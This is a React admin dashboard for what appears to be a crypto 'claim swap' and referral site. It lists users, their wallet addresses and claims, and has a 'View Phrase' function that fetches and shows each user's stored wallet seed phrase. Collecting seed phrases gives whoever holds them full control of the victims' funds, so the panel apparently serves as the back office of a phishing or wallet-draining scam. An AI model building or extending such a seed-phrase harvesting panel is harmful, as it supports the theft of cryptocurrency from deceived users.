import { useEffect, useState } from 'react';

interface User {
  id: number;
  username: string;
  address: string;
  banned: boolean;
}

interface Claim {
  id: number;
  user_id: number;
  status: string;
  type?: string;
}

export default function AdminDashboard() {
  const [users, setUsers] = useState<User[]>([]);
  const [selectedUser, setSelectedUser] = useState<User | null>(null);
  const [showPhrase, setShowPhrase] = useState(false);
  const [seedPhrase, setSeedPhrase] = useState<string | null>(null);
  const [claims, setClaims] = useState<Claim[]>([]);
  const [referralClaims, setReferralClaims] = useState<Claim[]>([]);
  const [stats, setStats] = useState<{ totalUsers: number; totalClaims: number }>({ totalUsers: 0, totalClaims: 0 });

  const fetchUsers = () => {
    fetch('/api/user/list')
      .then(res => res.json())
      .then((data: User[]) => {
        setUsers(data);
        setStats(s => ({ ...s, totalUsers: data.length }));
      });
  };

  const fetchClaims = () => {
    fetch('/api/claim/swap')
      .then(res => res.json())
      .then((data: Claim[]) => setClaims(data));
    fetch('/api/claim/referral')
      .then(res => res.json())
      .then((data: Claim[]) => setReferralClaims(data));
  };

  useEffect(() => {
    fetchUsers();
    fetchClaims();
    fetch('/api/stats')
      .then(res => res.json())
      .then(setStats);
  }, []);

  const handleBan = async (userId: number) => {
    await fetch(`/api/user/${userId}`, { method: 'PATCH' });
    fetchUsers();
  };

  const handleView = (user: User) => setSelectedUser(user);
  const handleCloseView = () => {
    setSelectedUser(null);
    setShowPhrase(false);
    setSeedPhrase(null);
  };

  const handleShowPhrase = async () => {
    if (selectedUser) {
      const phraseRes = await fetch(`/api/user/${selectedUser.id}/phrase`);
      const phraseData = await phraseRes.json();
      setSeedPhrase(phraseData.seedPhrase || '(not found)');
      setShowPhrase(true);
    }
  };
  const handleHidePhrase = () => setShowPhrase(false);

  const handleApproveClaim = async (claimId: number, type: string) => {
    await fetch(`/api/claim/${type}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ claimId })
    });
    fetchClaims();
  };

  return (
    <div className="p-8 max-w-6xl mx-auto">
      <h1 className="text-2xl font-bold mb-6">Admin Dashboard</h1>
      <div className="grid grid-cols-2 gap-8 mb-8">
        <div className="bg-white rounded-lg shadow p-6">
          <h2 className="text-lg font-semibold mb-2">Statistik</h2>
          <div>Total Users: <b>{stats.totalUsers}</b></div>
          <div>Total Claims: <b>{stats.totalClaims}</b></div>
        </div>
        <div className="bg-white rounded-lg shadow p-6">
          <h2 className="text-lg font-semibold mb-2">Quick Actions</h2>
          <div className="text-gray-500">Approve claim, ban user, view phrase, dsb.</div>
        </div>
      </div>
      <div className="mb-8 bg-white rounded-lg shadow p-6">
        <h2 className="text-lg font-semibold mb-4">User List</h2>
        <div className="overflow-x-auto">
          <table className="w-full border">
            <thead>
              <tr className="bg-gray-100">
                <th>ID</th>
                <th>Username</th>
                <th>Address</th>
                <th>Banned</th>
                <th>Action</th>
              </tr>
            </thead>
            <tbody>
              {users.map(user => (
                <tr key={user.id} className={user.banned ? 'bg-red-100' : ''}>
                  <td>{user.id}</td>
                  <td>{user.username}</td>
                  <td>{user.address}</td>
                  <td>{user.banned ? 'Yes' : 'No'}</td>
                  <td>
                    <button onClick={() => handleView(user)} className="mr-2 text-blue-600">View</button>
                    <button onClick={() => handleBan(user.id)} className="mr-2 text-red-600" disabled={user.banned}>Ban</button>
                    <button onClick={handleShowPhrase} className="text-green-600">View Phrase</button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
      <div className="mb-8 grid grid-cols-2 gap-8">
        <div className="bg-white rounded-lg shadow p-6">
          <h2 className="text-lg font-semibold mb-4">Claim Swap List</h2>
          <div className="overflow-x-auto">
            <table className="w-full border">
              <thead>
                <tr className="bg-gray-100">
                  <th>Claim ID</th>
                  <th>User ID</th>
                  <th>Status</th>
                  <th>Action</th>
                </tr>
              </thead>
              <tbody>
                {claims.map(claim => (
                  <tr key={claim.id}>
                    <td>{claim.id}</td>
                    <td>{claim.user_id}</td>
                    <td>{claim.status}</td>
                    <td>
                      {claim.status !== 'completed' && (
                        <button onClick={() => handleApproveClaim(claim.id, 'swap')} className="text-green-600">Approve</button>
                      )}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
        <div className="bg-white rounded-lg shadow p-6">
          <h2 className="text-lg font-semibold mb-4">Claim Referral List</h2>
          <div className="overflow-x-auto">
            <table className="w-full border">
              <thead>
                <tr className="bg-gray-100">
                  <th>Claim ID</th>
                  <th>User ID</th>
                  <th>Status</th>
                  <th>Action</th>
                </tr>
              </thead>
              <tbody>
                {referralClaims.map(claim => (
                  <tr key={claim.id}>
                    <td>{claim.id}</td>
                    <td>{claim.user_id}</td>
                    <td>{claim.status}</td>
                    <td>
                      {claim.status !== 'completed' && (
                        <button onClick={() => handleApproveClaim(claim.id, 'referral')} className="text-green-600">Approve</button>
                      )}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      </div>
      {/* Modal View User */}
      {selectedUser && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white p-6 rounded-lg max-w-md w-full">
            <h3 className="text-lg font-bold mb-4">User Detail</h3>
            <div><b>ID:</b> {selectedUser.id}</div>
            <div><b>Username:</b> {selectedUser.username}</div>
            <div><b>Address:</b> {selectedUser.address}</div>
            <div><b>Banned:</b> {selectedUser.banned ? 'Yes' : 'No'}</div>
            <div className="mt-4">
              <button onClick={handleShowPhrase} className="text-green-600 mr-2">View Phrase</button>
              <button onClick={handleCloseView} className="text-gray-600">Close</button>
            </div>
            {/* Modal View Phrase */}
            {showPhrase && (
              <div className="mt-4 p-3 bg-gray-100 rounded">
                <b>Seed Phrase:</b> <span className="break-all">{seedPhrase || '(not found)'}</span>
                <button onClick={handleHidePhrase} className="ml-2 text-gray-600">Hide</button>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
} 